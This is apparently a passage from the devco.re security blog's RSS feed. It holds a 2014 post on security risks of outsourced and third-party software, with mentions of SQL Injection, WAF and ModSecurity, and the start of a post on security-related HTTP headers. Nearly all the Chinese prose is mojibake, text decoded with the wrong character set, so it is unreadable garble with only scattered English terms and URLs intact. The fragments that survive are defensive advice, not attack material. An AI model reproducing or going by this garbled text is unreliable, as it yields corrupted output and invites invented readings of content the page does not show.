&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;ÈÄôÊ®£ÁöÑÊÉÖÂ¢É‰Ω†ÊòØÂê¶ÁÜüÊÇâÔºü&lt;/p&gt;

&lt;p&gt;ÂÖ¨Âè∏Êúâ‰∏ÄÂ•óÂÆ¢Ë£ΩÂåñÁöÑÁ≥ªÁµ±ÈúÄË¶ÅÂª∫ÁΩÆÔºå‰ΩÜÊòØÂõ†ÁÇ∫ÂÖ¨Âè∏ÂÖßÈÉ®ÈñãÁôº‰∫∫Âì°‰∏çË∂≥ÔºåÂõ†Ê≠§ÊääÈÄôÂÄãÁ≥ªÁµ±Â§ñÂåÖÂá∫ÂéªÁµ¶Âª†ÂïÜÂÅö„ÄÇË≤®ÊØî‰∏âÂÆ∂‰∏çÂêÉËôßÔºåÊØî‰∫Ü A B C ‰∏âÂÆ∂ÔºåÁôºÁèæ A ÂÆ∂ÊúÄ‰æøÂÆúÂØ¶ÊÉ†Ôºå‰∫§Ë≤®ÊôÇÈñìÂèàÁü≠„ÄÇÊ±∫ÂÆöÂ∞±ÊääÈÄôÂÄãÁ≥ªÁµ±ÁôºÂåÖÁµ¶ A Âª†ÂïÜÂÅö„ÄÇÂçäÂπ¥ÈÅéÂéª‰∫ÜÔºåÈÄôÂÄãÂª†ÂïÜÈ†ÜÂà©‰∫§Ë≤®ÁµêÊ°à„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ÄÂπ¥ÈÅéÂæåÔºåÁôºÁèæÈÄôÂÄãÁ≥ªÁµ±Á´üÁÑ∂ÈÅ≠Âà∞ÂÖ•‰æµÔºå‰∏ªÂãïÊîªÊìäÂÖßÈÉ®ÂÖ∂‰ªñ‰º∫ÊúçÂô®„ÄÇ„Äå‰∏çÊòØÊúâË≤∑Èò≤ÁÅ´ÁâÜÂóéÔºüÊÄéÈ∫ºÈÇÑÊúÉË¢´ÂÖ•‰æµÔºü„ÄçËÄÅÈóÜË™™„ÄÇÈÄôÂèØÂö¥Èáç‰∫ÜÔºåÈ¶¨‰∏äÊâæÂª†ÂïÜ‰æÜÂàÆ‰∏ÄÈ†ì„ÄÇÊ≤íÊÉ≥Âà∞ÔºåA Âª†ÂïÜË°®Á§∫ÔºåË©≤Ê°àÂ∑≤Á∂ìÈ†ÜÂà©ÁµêÊ°àÔºåÁ∂≠Ë≠∑Êúü‰πüÂ∑≤Á∂ìÈÅé‰∫ÜÔºåÊ≤íËæ¶Ê≥ïÊèê‰æõÂçîÂä©ÔºåÈô§ÈùûÁπºÁ∫åÁ∞ΩË®ÇÁ∂≠Ë≠∑ÂêàÁ¥Ñ„ÄÇÂïèÈ°åÁ∏ΩÂæóËß£Ê±∫ÔºåÁ∞ΩË®Ç‰∫ÜÁ∂≠Ë≠∑ÂêàÁ¥Ñ‰πãÂæåÔºåA Âª†ÂïÜ‰πüÂçîÂä©ÊääÁóÖÊØíÁ†çÊéâ‰∫Ü„ÄÇÂúìÊªøÁµêÊùüÔºü‰∫ãÊÉÖÊúâÈÇ£È∫ºÁ∞°ÂñÆÂóéÔºü&lt;/p&gt;

&lt;p&gt;ÈÅé‰∫ÜÂÖ©Â§©ÔºåÁ≥ªÁµ±ÂèàÈñãÂßãÊîªÊìäÂÖ∂‰ªñ‰º∫ÊúçÂô®„ÄÇ„ÄåÁóÖÊØí‰∏çÊòØÂ∑≤Á∂ìÁ†çÊéâ‰∫ÜÂóéÔºü„ÄçËÄÅÈóÜË™™„ÄÇÂïèÈ°åÂú®Âì™Â§ßÂÆ∂ÊáâË©≤ÈÉΩÂæàÊ∏ÖÊ•ö„ÄÇÂú®Â∞ãÊâæË≥áÂÆâÂª†ÂïÜÂçîÂä©‰πã‰∏ãÔºåÁôºÁèæ‰∏ªÊ©üÊòØÂõ†ÁÇ∫ A Âª†ÂïÜË®≠Ë®àÁöÑÁ≥ªÁµ±Âê´ÊúâÊºèÊ¥ûÔºåÂ∞éËá¥ SQL Injection ÂïèÈ°åÔºåÈÅ≠ÊîªÊìäËÄÖÂà©Áî®Ê§çÂÖ•ÊÉ°ÊÑèÁ®ãÂºè„ÄÇA Âª†ÂïÜÁôæËà¨ÁÑ°Â•àÔºåÊë∏Êë∏ÈºªÂ≠êÊääÈÄôÂÄãÊºèÊ¥û‰øÆË£úËµ∑‰æÜ„ÄÇÂèàÈÅé‰∫ÜÂÖ©Â§©ÔºåÂÜçÂ∫¶ÈÅ≠Âà∞ÂÖ•‰æµ„ÄÇÁúã‰∫ÜÁúãÔºåÁôºÁèæÂèàÊòØÂè¶‰∏ÄÂÄã SQL Injection ÂïèÈ°å„ÄÇÂú®ÂπæÊ¨°ËàáÊîªÊìäËÄÖÁöÑ‰∏çÊñ∑ËßíÂäõ‰πã‰∏ãÔºåÁµÇÊñºÂ•ΩÂÉèÊääÂïèÈ°åÈÉΩ‰øÆÂÆå‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÅé‰∫Ü‰∏ÄÈÄ±ÔºåÁ≥ªÁµ±ÂÜçÂ∫¶ÊúâÊÉ°ÊÑèÁ®ãÂºèÁöÑËπ§Ë∑°ÔºåA Âª†ÂïÜ‰πüÁÑ°ËÉΩÁÇ∫Âäõ„ÄÇË≥áÂÆâÂª†ÂïÜË°®Á§∫ÔºåË≤∑ÈÄôÂÄãÂ∞±Â∞ç‰∫ÜÔºÅÂú®Èô∏Á∫åË¢´Ëø´Ë≤∑‰∫ÜÈò≤ÁÅ´ÁâÜ„ÄÅWAF„ÄÅIDS Á≠âË®≠ÂÇôÂæåÔºåÈõñÁÑ∂ÂïèÈ°åË≤å‰ººÊîπÂñÑÔºå‰ΩÜÁ≥ªÁµ±‰ªçÁÑ∂Èõ∂ÊòüÊúâÂÖ•‰æµ‰∫ã‰ª∂ÁôºÁîü„ÄÇÂÖ¨Âè∏Âè™Â•Ω„ÄåÊñ∑ÁÑ∂ËôïÁΩÆ„ÄçÔºåÁ≠âÂæÖ‰∏ãÊ¨°È†êÁÆóÔºåÂè¶Ë´ãÂª†ÂïÜÈáçÊñ∞ÈñãÁôºÁ≥ªÁµ±„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 1ÔºöË©≤Á≥ªÁµ±ÊòØÂê¶ÈÇÑÊúâÂÖ∂‰ªñÊºèÊ¥ûÔºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 2ÔºöÂÖ¨Âè∏ÁöÑËôïÁΩÆÊòØÂê¶Ê≠£Á¢∫Ôºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 3ÔºöA Âª†ÂïÜÁöÑÂÖ∂‰ªñÂÆ¢Êà∂ÊòØÂê¶ÊúâÈ°û‰ººÁöÑÂïèÈ°åÔºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 4Ôºö‰∏çÊòØÊúâË≤∑Ë≥áÂÆâË®≠ÂÇôÔºüÁÇ∫‰ªÄÈ∫ºÈÇÑÊúÉÊúâË≥áÂÆâ‰∫ã‰ª∂Ôºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 5ÔºöÂÖ¨Âè∏Ë©≤Â¶Ç‰ΩïËá™‰øùÔºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 6ÔºöÂª†ÂïÜË©≤Â¶Ç‰ΩïËá™‰øùÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊÉ≥‰∏Ä‰∏ã‰ª•‰∏äÂêÑÈªûÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 1ÔºöË©≤Á≥ªÁµ±ÊòØÂê¶ÈÇÑÊúâÂÖ∂‰ªñÊºèÊ¥ûÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â¶ÇÊûú‰∏ÄÂÄãÂú®ÈñãÁôºÊôÇÊúüÂ∞±Ê≤íÊúâÊ≥®ÊÑèÂÆâÂÖ®ÁöÑÁ≥ªÁµ±ÔºåÂæàÊúâÂèØËÉΩÊúâÊõ¥Â§ö‰∏çÁÇ∫‰∫∫Áü•ÁöÑÊºèÊ¥û„ÄÇÂ¶ÇÊûúË¢´Âãï‰æùË≥¥Ë≥áÂÆâ‰∫ã‰ª∂ÔºåÁôºÁîü‰∏Ä‰ª∂‰øÆ‰∏ÄÂÄãÊºèÊ¥ûÔºåÈÇ£ÊòØÊ∞∏ÁÑ°Ê≠¢Áõ°ÁöÑ„ÄÇÊ≠£Á¢∫ÁöÑÊñπÂºèÊáâË©≤ÊòØÁõ¥Êé•ÈáùÂ∞ç A Âª†ÂïÜÁöÑÂéüÂßãÁ¢ºÈÄ≤Ë°åÈªëÁÆ±&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;„ÄÅÁôΩÁÆ±Ê∫êÁ¢ºÊ™¢Ê∏¨ (Code Review)ÔºåÊâçËÉΩÂø´ÈÄüÊâæÂá∫ÊâÄÊúâÈ¢®Èö™„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 2ÔºöÂÖ¨Âè∏ÁöÑËôïÁΩÆÊòØÂê¶Ê≠£Á¢∫Ôºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;„ÄåË≤®ÊØî‰∏âÂÆ∂‰∏çÂêÉËôß„ÄçÔºåÁØÄÂÑâÁ¢∫ÂØ¶ÊòØÁæéÂæ∑Ôºå‰ΩÜÊòØÂú®Ë≥áË®äÁî¢Ê•≠‰∏≠ÔºåË∂ä‰æøÂÆúÁöÑÁ≥ªÁµ±ÂèØËÉΩ‰ª£Ë°®ËëóÊõ¥Â§öÁöÑ cost downÔºåÈô§‰∫ÜÁäßÁâ≤ÊéâÂìÅË≥™‰πãÂ§ñÔºåÂèØËÉΩÂ∏∂Áµ¶‰ºÅÊ•≠Êõ¥Â§öÊêçÂ§±„ÄÇÂú®Ë≥áÂÆâ‰∫ã‰ª∂ÁôºÁîüÊôÇÔºå‰∏ÄÂÆöË¶ÅÊâæÂéüÊú¨Á∂≠ÈÅãÂª†ÂïÜË≤†Ë≤¨Ôºå‰∏¶‰∏îËàáË≥áÂÆâÈ°ßÂïèÂÖ¨Âè∏ÈÖçÂêàÔºåÂçîÂä©Âª†ÂïÜÊääÂïèÈ°åËß£Ê±∫„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 3ÔºöA Âª†ÂïÜÁöÑÂÖ∂‰ªñÂÆ¢Êà∂ÊòØÂê¶ÊúâÈ°û‰ººÁöÑÂïèÈ°åÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁæÖÈ¶¨‰∏çÊòØ‰∏ÄÊó•ÈÄ†ÊàêÁöÑÔºå‰∏çÂÆâÂÖ®ÁöÑÁ≥ªÁµ±‰πü‰∏çÊòØ‰∏ÄÂÄãÊºèÊ¥ûÈÄ†ÊàêÁöÑ„ÄÇÂª†ÂïÜÈÄöÂ∏∏ÊòØÂÅöÂá∫‰∏Ä‰ªΩÁ≥ªÁµ±ÔºåÂÆ¢Ë£ΩÂåñË≤©Ë≥£Áµ¶‰∏çÂêåÁöÑ‰ºÅÊ•≠Áî®Êà∂„ÄÇÂ¶ÇÊûúÂú®Âª∫ÁΩÆÁöÑÈÅéÁ®ã‰∏≠Ê≤íÊúâÊ≥®ÊÑèÂÆâÂÖ®ÂïèÈ°åÔºå‰ªäÂ§©ÈÄôÂÆ∂ÂÆ¢Êà∂ÊúâÈÄôÂÄãÊºèÊ¥ûÔºåÂà•ÁöÑÂÆ¢Êà∂‰∏ÄÂÆö‰πüÊúÉÊúâ„ÄÇÂõ†Ê≠§Â¶ÇÊûúÊé°Áî®‰∫Ü‰∏çËâØÁöÑÂª†ÂïÜÂØ¶‰ΩúÁöÑÁ≥ªÁµ±Ôºå‰∏ã‰∏ÄÂÄãË¢´Èß≠ÁöÑÂèØËÉΩÂ∞±ÊòØËá™Â∑±„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 4Ôºö‰∏çÊòØÊúâË≤∑Ë≥áÂÆâË®≠ÂÇôÔºüÁÇ∫‰ªÄÈ∫ºÈÇÑÊúÉÊúâË≥áÂÆâ‰∫ã‰ª∂Ôºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;„Äå‰∏çÊòØÊúâË≤∑Èò≤ÁÅ´ÁâÜÂóéÔºüÊÄéÈ∫ºÈÇÑÊúÉË¢´ÂÖ•‰æµÔºü„ÄçÊòØÂæàÂ§öÂÇ≥Áµ±ÊÄùÁ∂≠‰ºÅÊ•≠ÁöÑÂÖ±ÂêåÂøÉËÅ≤„ÄÇÈò≤ÁÅ´ÁâÜ‰∏çÊòØËê¨Èùà‰∏πÔºåÈß≠ÂÆ¢‰πüÁµïÂ∞ç‰∏çÊòØÈõªËÖ¶„ÄÇ‰∏¶‰∏çÊòØÂÆåÂÖ®‰æùË≥¥Ë≥áÂÆâË®≠ÂÇôÂ∞±ËÉΩÂ§†ÈÅøÂÖçË≥áÂÆâÂïèÈ°å„ÄÇÂú®Èß≠ÂÆ¢ÁöÑÊâãÊ≥ï‰∏≠ÔºåÊõ¥Â§öÊòØÂ¶Ç‰ΩïÁπûÈÅéÂêÑÁ®ÆÈò≤Á¶¶Ë®≠ÂÇôÊâãÊÆµÔºåÁîöËá≥Êúâ‰∫õË≥áÂÆâË®≠ÂÇôÊú¨Ë∫´Á´üÁÑ∂Âê´ÊúâË≥áÂÆâÂº±ÈªûÔºå‰ºÅÊ•≠ÂèçËÄåÂõ†ÁÇ∫Ë≥áÂÆâË®≠ÂÇôÂ∞éËá¥Á≥ªÁµ±Ë¢´ÂÖ•‰æµ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠£Á¢∫ÁöÑÊÄùÁ∂≠ÊáâË©≤ÊòØÂæû‰∫∫ÈñãÂßãÂÅöËµ∑ÔºåÂª∫Á´ãÊ≠£Á¢∫ÁöÑË≥áÂÆâËßÄÂøµ„ÄÅË≥áÂÆâÊÄùÁ∂≠ÔºåÂ≠∏ÁøíÈß≠ÂÆ¢ÁöÑÊÄùÁ∂≠„ÄÇÂª∫Á´ãÊ≠£Á¢∫ÁöÑÁ≥ªÁµ±ÈñãÁôºÊµÅÁ®ã„ÄÅÂª∫Á´ãÊ≠£Á¢∫ÁöÑË≥áÂÆâ‰∫ã‰ª∂ËôïÁêÜÊµÅÁ®ã„ÄÇÂ∞ãÊâæ‰ø°Ë≠ΩËâØÂ•ΩÁöÑË≥áÂÆâÈ°ßÂïèÂª†ÂïÜÔºåÂÆöÊúüÈáùÂ∞ç‰ºÅÊ•≠ÂÖßÈÉ®ÂêÑÁ≥ªÁµ±ÈÄ≤Ë°åÊª≤ÈÄèÊ∏¨Ë©¶„ÄÅÂº±ÈªûÊéÉÊèè„ÄÇÂÆâÂÖ®ÁöÑÂª∫Á´ãÁµïÈùû‰∏ÄËπ¥ÂèØÂèäÔºåÂîØÊúâ‰∏ÄÊ≠•Ê≠•Ë∏èÁ©©ÊâçËÉΩËµ∞ÂæóÊõ¥ÈÅ†„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂïèÈ°å 5ÔºöÂÖ¨Âè∏Ë©≤Â¶Ç‰ΩïËá™‰øùÔºü&lt;/li&gt;
  &lt;li&gt;ÂïèÈ°å 6ÔºöÂª†ÂïÜË©≤Â¶Ç‰ΩïËá™‰øùÔºü&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë´ãÁúã‰∏ã‰∏ÄÂÄãÁ´†ÁØÄ„ÄåÂª∫Ë≠∞Â∞çÁ≠ñ„Äç„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âª∫Ë≠∞Â∞çÁ≠ñ&quot;&gt;Âª∫Ë≠∞Â∞çÁ≠ñ&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_cover.png&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰∏ÄÂÄãÂÆâÂÖ®ÁöÑÁ≥ªÁµ±ÔºåÁµïÂ∞çÊòØÁî±Âü∫Á§éÂª∫Ë®≠ÈñãÂßãÔºåÊØèÂÄãÁí∞ÁØÄÈÉΩÂÖºÈ°ßÂà∞ÂÆâÂÖ®ÁöÑË®≠Ë®àÔºå‰∏¶‰∏îÂÆöÊúüÁ®ΩÊ†∏Á®ãÂºèÁ¢ºÂÆâÂÖ®Ôºå‰ΩøÁî®Ê≠£Á¢∫ÂÆâÂÖ®ÁöÑÊñπÂºèÈñãÁôº„ÄÇÂ¶ÇÊûúÁ≥ªÁµ±ÈñãÁôºÂàùÊúüÂ∞±Ê≤íÊúâÂÖºÈ°ßÂÆâÂÖ®ÔºåÂæåÊúü‰∏çÁÆ°ÊÄéÈ∫º‰øÆË£úÔºåÈÉΩÈÇÑÊòØÊúÉÊúâÊºèÊ¥ûËÆìÊîªÊìäËÄÖÊúâÊ©üÂèØË∂Å„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ºÅÊ•≠Ë©≤Â¶Ç‰ΩïËá™‰øùÔºü‰ΩøÁî® OpenSource Á¨¨‰∏âÊñπÂ•ó‰ª∂ÊàñËÄÖÊòØÁ≥ªÁµ±ÂßîÂ§ñÈñãÁôºÔºåÊòØ‰ºÅÊ•≠ÁÑ°ÂèØÈÅøÂÖçÁöÑ„ÄÇÂ¶ÇÊûúÊòØÁ¨¨‰∏âÊñπÂ•ó‰ª∂ÔºåÂπ≥ÊôÇÂèØ‰ª•Â§öÂä†Ê≥®ÊÑèÂ•ó‰ª∂ÁöÑË≥áÂÆâÊ∂àÊÅØÔºåÂ¶ÇÊûú‰∏ÄÊúâÊñ∞ÁöÑÊºèÊ¥ûË¢´ÁôºÁèæÔºåÂ∞áÂèØ‰ª•Âú®Á¨¨‰∏ÄÊôÇÈñìÊáâËÆä„ÄÇËã•Ê≤íÊúâË∂≥Â§†‰∫∫ÂäõÂØÜÂàáÊ≥®ÊÑèË≥áÂÆâÊ∂àÊÅØÔºå‰πüÂèØ‰ª•ÂßîË´ãË≥áÂÆâÈ°ßÂïèÂª†ÂïÜÂçîÂä©ÔºåÂú®ÂæóÁü•Ë≥áÂÆâÊ∂àÊÅØÁöÑÁ¨¨‰∏ÄÊôÇÈñìÈÄöÂ†±‰ºÅÊ•≠„ÄÇÂßîÂ§ñÈñãÁôºÁöÑÁ≥ªÁµ±Ôºå‰ºÅÊ•≠ÂèØ‰ª•Ë¶ÅÊ±ÇÂª†ÂïÜÊèêÂá∫Â∞àÊ•≠ÂÖ¨Ê≠£Á¨¨‰∏âÊñπË≥áÂÆâÂÖ¨Âè∏ÈÄ≤Ë°åÊ™¢Ê∏¨Ôºå‰∏¶‰∏îÊèêÂá∫ÂÆâÂÖ®Â†±ÂëäÔºåË≠âÊòéË©≤Á≥ªÁµ±ÊúâÁ∂ìÈÅéÊª≤ÈÄèÊ∏¨Ë©¶Á≠âÂÆâÂÖ®Ê™¢Ê∏¨Ôºå‰øùÈöúÈõôÊñπÁöÑÊ¨äÂà©„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÁ≥ªÁµ±Â∑≤Á∂ìË¢´ÂÖ•‰æµ‰∫ÜÔºåÊàñËÄÖÊòØË¢´Êè≠Èú≤‰∫ÜÂÆâÂÖ®ÊºèÊ¥ûÔºåË©≤Â¶Ç‰ΩïËá™‰øùÂë¢ÔºüÂú®ÊºèÊ¥ûÂ§ßÈáèÊè≠Èú≤ÁöÑÊÉÖÊ≥Å‰∏ãÔºåÁ≥ªÁµ±Êõ¥ÊúÉÊàêÁÇ∫ÊîªÊìäËÄÖÁöÑÁõÆÊ®ô„ÄÇÂõ†Ê≠§Ë¶ÅÂãôÂøÖÂØÜÂàáÊ≥®ÊÑè‰ΩøÁî®Ë©≤Â•ó‰ª∂ÁöÑ‰º∫ÊúçÂô®ÁãÄÊ≥ÅÔºå‰∏¶‰∏îÈÅµÂæ™‰ª•‰∏ãÂéüÂâáÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂØÜÂàáÊ≥®ÊÑèÂÆòÊñπÁöÑÊõ¥Êñ∞Á®ãÂºè‰∏¶Á´ãÂç≥Êõ¥Êñ∞&lt;/li&gt;
  &lt;li&gt;Ê≠§Âè∞‰º∫ÊúçÂô®ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÂàáÂãøËàá‰ªñÂè∞ÂÖ±Áî®&lt;/li&gt;
  &lt;li&gt;Â∞áÊ≠§Âè∞‰º∫ÊúçÂô®ËàáÂÖ∂‰ªñ‰º∫ÊúçÂô®ÈöîÈõ¢ÔºåÈÅøÂÖçÈÅ≠ÂÖ•‰æµÊôÇÂèóÂÆ≥ÁØÑÂúçÊì¥Â§ß&lt;/li&gt;
  &lt;li&gt;Áï∞Âú∞ÂÇô‰ªΩ‰º∫ÊúçÂô®ÁöÑÁ≥ªÁµ±Ë®òÈåÑÔºå‰∏¶ÂÆöÊôÇÊ™¢Èñ±Ë®òÈåÑÔºåËßÄÂØüÊòØÂê¶ÊúâÂèØÁñëË°åÁÇ∫&lt;/li&gt;
  &lt;li&gt;ËÄÉÊÖÆÊé°Áî® Web Application Firewall (WAF)„ÄÅModSecurity ‰º∫ÊúçÂô®ÂÆâÂÖ®Ê®°ÁµÑÔºåÂ¢ûÂä†ÊîªÊìäÈõ£Â∫¶&lt;/li&gt;
  &lt;li&gt;ÈáçÊñ∞Ë©ï‰º∞‰ΩøÁî®ÈÅ≠ÂÖ•‰æµÂ•ó‰ª∂ÁöÑÂøÖË¶ÅÊÄß‰ª•ÂèäÂÆâÂÖ®ËÄÉÈáèÔºåÈÅøÂÖçÊàêÁÇ∫‰ºÅÊ•≠ÁöÑÈö±Âê´È¢®Èö™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂Âä†ÈÄüÈñãÁôºÁØÄÁúÅÊàêÊú¨ÁöÑÂêåÊôÇÔºåÂãôÂøÖ‰πüË¶ÅËÄÉÊÖÆÂÆâÂÖ®ÁöÑÂïèÈ°åÔºåÊâç‰∏çÊúÉÂõ†Â∞èÂ§±Â§ßÔºåÈÄ†Êàê‰ºÅÊ•≠Êõ¥Â§ßÁöÑÊêçÂ§±„ÄÇÂêåÊôÇ‰ºÅÊ•≠‰πüÂøÖÈ†àÂ¢ûÂä†Ë≥áÂÆâÁöÑÁ¥†È§ä‰ª•Âèä‰∫ÜËß£ÊîªÊìäËÄÖÁöÑÊÄùÁ∂≠ÔºåÂà•ËÆìËá™Â∑±ÁöÑ‰ºÅÊ•≠ÊàêÁÇ∫‰∏ã‰∏ÄÂÄãË≥áÂÆâ‰∫ã‰ª∂Â†±Â∞éÁöÑÂ∞çË±°„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/</link>
                <guid>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</guid>
                <pubDate>Fri, 14 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Headers ÁöÑË≥áÂÆâË≠∞È°å (1)</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;Èö®ËëóÈß≠ÂÆ¢ÊîªÊìä‰∫ã‰ª∂Êó•ÁõäÊº∏Â¢ûÔºåÂéüÊú¨Á∂ìÂ∏∏Ë¢´Â§ßÁúæÊâÄÂøΩË¶ñÁöÑÁ∂≤Á´ôË≥áÂÆâÂïèÈ°åÔºåÁèæÂú®Â∑≤Á∂ìÈÄêÊº∏ÂèóÂà∞ÈáçË¶ñ„ÄÇ‰ΩÜÊòØÔºåË®±Â§ö‰ºÅÊ•≠‰∏ªÊàñÈñãÁôº‰∫∫Âì°ÈõñÁÑ∂ÂæàÊÉ≥Âº∑ÂåñÁ∂≤Á´ôÁöÑÂÆâÂÖ®ÊÄßÔºåÂçª‰∏çÁü•ÈÅìË©≤Â¶Ç‰ΩïÂæû‰ΩïËëóÊâã„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ºÅÊ•≠‰∏ªÈÄöÂ∏∏ÊÉ≥Âà∞ÁöÑÊîπÂñÑÊñπÊ°àÊòØÊ∑ªË≥ºË≥áÂÆâË®≠ÂÇôÔºåÂ∏åÊúõÂèØ‰ª•‰∏ÄÂãûÊ∞∏ÈÄ∏„ÄÇÊàëÂÄëÂßë‰∏îÂÖà‰∏çË´á„Äå&lt;strong&gt;Ë≥áË®äÁïåÊ≤íÊúâÊ∞∏ÈÅ†ÁöÑÂÆâÂÖ®&lt;/strong&gt;„ÄçÈÄô‰ª∂‰∫ãÔºå‰ºÅÊ•≠ÂÖâÊòØË¶ÅË≤∑Âà∞ÊúâÊïàÁöÑË≥áÂÆâË®≠ÂÇôÂ∞±ÊòØ‰∏Ä‰ª∂‰ª§‰∫∫È†≠ÁóõÁöÑ‰∫ãÊÉÖÔºå‰∏ç‰ΩÜË¶ÅËä±Ë®±Â§öÊôÇÈñìËÅΩÂèñÂª†ÂïÜÁöÑÁ∞°Â†±ÔºåËÄóË≤ªÂ§ßÁ≠ÜÁöÑÁ∂ìË≤ªÊé°Ë≥ºÔºåË≥ºË≤∑‰πãÂæåÈÇÑË¶ÅË´ãÂì°Â∑•ÊàñÂéüÂª†ÊäÄË°ì‰∫∫Âì°ÂçîÂä©Ë™øÊ†°„ÄÅË®≠ÂÆöÊàñÊïôÂ≠∏ÔºåÂê¶ÂâáË≤∑‰∫ÜÁ≠âÊñºÊ≤íË≤∑„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂ∞çÊñºÊäÄË°ì‰∫∫Âì°‰æÜË™™ÔºåËã•Ë¶ÅÂº∑ÂåñÁ∂≤Á´ôÂÆâÂÖ®ÊÄßÔºåÂøÖÈ†àÂÖà‰∫ÜËß£Èß≠ÂÆ¢Â¶Ç‰ΩïÊîªÊìäÔºåÊâçÁü•ÈÅìÂ¶Ç‰ΩïÂª∫Á´ãÊ†πÊú¨ÊÄßÁöÑÈò≤Á¶¶Ê©üÂà∂„ÄÇ‰ΩÜÊòØ‰ºÅÊ•≠‰∏ªÈÄöÂ∏∏Êç®‰∏çÂæóÈÄÅÂì°Â∑•ÂéªÂèÉÂä†Â∞àÊ•≠ÁöÑÊïôËÇ≤Ë®ìÁ∑¥ÔºåÂè∞ÁÅ£Âì°Â∑•ÊãøÁöÑ 22k ‰ΩéËñ™‰πü‰ΩéÂæóÂ∏∏Â∏∏‰ª§‰∫∫Êç®‰∏çÂæóËä±Èå¢Âéª‰∏äË™≤„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊúâ‰∏ÄÁ®ÆÊñπÂºèÂèØ‰ª•Â¢ûÂº∑Á∂≤Á´ôÁöÑÂü∫Êú¨ÂÆâÂÖ®ÊÄßÔºåËÄå‰∏î‰∏çÈúÄË¶ÅËä±Â§ßÈå¢ÔºåÂèàÂèØ‰ª•ËÆìÈñãÁôº‰∫∫Âì°‰∏çÁî®Â§ßÂπÖÂ∫¶ËÆäÊõ¥Á®ãÂºèÔºåÊáâË©≤ÊòØÂÄãÁöÜÂ§ßÊ≠°ÂñúÁöÑÊñπÊ°àÔºü&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Á©∂Á´üÊúâÊ≤íÊúâ‰ΩéÊàêÊú¨ÁöÑÁ∞°ÊòìÈò≤Á¶¶ÊñπÊ≥ï&quot;&gt;Á©∂Á´üÊúâÊ≤íÊúâ‰ΩéÊàêÊú¨ÁöÑÁ∞°ÊòìÈò≤Á¶¶ÊñπÊ≥ïÔºü&lt;/h3&gt;

&lt;p&gt;ÊúâÁöÑÔºÅÁõÆÂâçÂêÑÂÆ∂ÁÄèË¶ΩÂô® (Google Chrome„ÄÅFirefox„ÄÅSafari„ÄÅIE) ÂÖ∂ÂØ¶Â∑≤Á∂ìÊîØÊè¥Ë®±Â§öÁ®ÆË≥áÂÆâÁõ∏ÈóúÁöÑ HTTP headers„ÄÇÈñãÁôº‰∫∫Âì°Ëã•Âú®‰º∫ÊúçÂô®Ë®≠ÂÆöÂä†ÂÖ•Êüê‰∫õ headersÔºåÁÄèË¶ΩÂô®Êî∂Âà∞ response ÊôÇÂ∞±ÊúÉÂü∑Ë°åÁõ∏Â∞çÊáâÁöÑÈò≤Á¶¶Ê©üÂà∂ÔºåÂ¶ÇÊ≠§‰∏Ä‰æÜÂèØÁõ¥Êé•ÊèêÂçáÁ∂≤È†ÅÊáâÁî®Á®ãÂºèÁöÑÂü∫Êú¨ÂÆâÂÖ®ÊÄß„ÄÇÈÄô‰∫õ HTTP headers ÈÄöÂ∏∏‰πüÂ∑≤Ë¢´Ë®±Â§öÂ∏∏Ë¶ãÁöÑ framework 